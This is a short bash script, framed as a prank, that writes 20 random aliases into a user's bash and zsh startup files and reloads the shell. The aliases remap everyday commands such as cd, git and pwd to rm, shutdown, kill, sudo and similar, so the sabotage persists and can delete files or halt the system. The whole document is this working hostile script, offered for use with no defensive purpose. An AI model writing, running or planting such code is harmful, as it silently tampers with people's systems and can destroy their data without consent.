#!/bin/bash

a=("cd" "which" "whoami" "du" "date" "killall" "uptime" "top" "wget" "pwd" "w" "git")
b=("cal" "ps" "ls" "tree" "sudo" "apt" "du" "mkdir" "rm" "bg" "shutdown" "kill")

aliases=0
echo '#------ You Got pranked------' >> ~/.bash_profile
echo '#------ You Got pranked------' >> ~/.bashrc
echo '#------ You Got pranked------' >> ~/.zshrc
while [ $aliases -lt 20 ]
do
    i=$(( RANDOM % 11 ))
    j=$(( RANDOM % 11 ))
    echo "alias ${a[$i]}=\"${b[$j]}\"" >> ~/.bash_profile
    echo "alias ${a[$i]}=\"${b[$j]}\"" >> ~/.bashrc
    echo "alias ${a[$i]}=\"${b[$j]}\"" >> ~/.zshrc

    aliases=`expr $aliases + 1`
done

$(exec "$SHELL")
